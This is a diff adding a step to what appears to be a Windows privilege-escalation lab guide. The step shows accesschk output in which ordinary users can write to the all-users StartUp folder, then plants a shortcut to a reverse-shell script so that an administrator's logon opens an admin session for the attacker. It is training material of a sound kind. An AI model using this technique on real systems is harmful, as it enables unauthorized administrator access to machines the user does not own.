@@ -228,3 +228,23 @@ you will get cmd sessio with admin previlages
 NOTE: this command will search for specific program in runing task list:
 
     tasklist /V | findstr mspaint.exe
+
+# 15 - Startup Apps :
+
+let's check the permissions of StartUp folder:
+
+    C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+
+    # RW BUILTIN\Users
+    # RW WIN-QBA94KB3IOF\Administrator
+    # RW WIN-QBA94KB3IOF\admin
+    # RW NT AUTHORITY\SYSTEM
+    # RW BUILTIN\Administrators
+    # R  Everyone
+
+notice that anyone in BUILTIN\Users group can read an write to this dir
+so let's create shortcut for our reverse shell script:
+
+    cscript C:\PrivEsc\CreateShortcut.vbs
+
+start a listener and wait until the admin logon then u'll get new session with admin privilages
